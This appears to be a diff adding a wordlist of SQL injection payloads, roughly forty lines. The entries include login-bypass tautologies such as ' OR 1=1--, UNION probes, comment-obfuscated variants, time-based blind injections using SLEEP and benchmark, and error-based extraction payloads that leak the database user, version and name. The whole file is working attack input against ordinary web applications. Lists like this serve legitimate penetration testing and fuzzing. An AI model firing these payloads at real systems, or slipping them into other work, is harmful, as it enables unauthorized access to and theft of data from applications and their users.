@@ -1,0 +1,40 @@
+' OR '1'='1'--
+' OR 1=1--
+' OR 'a'='a'--
+' OR 'x'='x'#
+' OR 0=0/*
+') OR ('1'='1'--
+') OR ('1'='1'#
+') OR ('1'='1'/*
+admin'--
+admin' #
+admin'/*
+' UNION SELECT NULL--
+' /*!50000UNION*/ SELECT NULL--
+'/**/OR/**/1=1--
+' OR SLEEP(5)--
+' OR benchmark(5000000,MD5(1))--
+' OR 2 LIKE 2--
+' OR 2 LIKE 2# 
+' OR 2 LIKE 2--
+' OR 2 LIKE 2/* 
+' or ''-' 
+' or '' ' -- 
+' or '' ' -- - 
+' or 1=1# 
+' or 1=1-- 
+' or 1=1/*
+' or 'x'='x 
+' or 0=0 --
+' or 0=0 #
+' or 0=0 /*
+') or ('x'='x 
+') or ('x'='x'-- 
+') or ('x'='x'# 
+') or ('x'='x'/* 
+') and sleep(3)--
+' and sleep(3)#
+' and sleep(3)/* 
+) AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(0x3a3a,USER(),0x3a3a))),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' or extractvalue(null,concat(0x3a,(select version()),0x3a))--
+' or updatexml(null,concat(0x3a,(select database()),0x3a),null)--
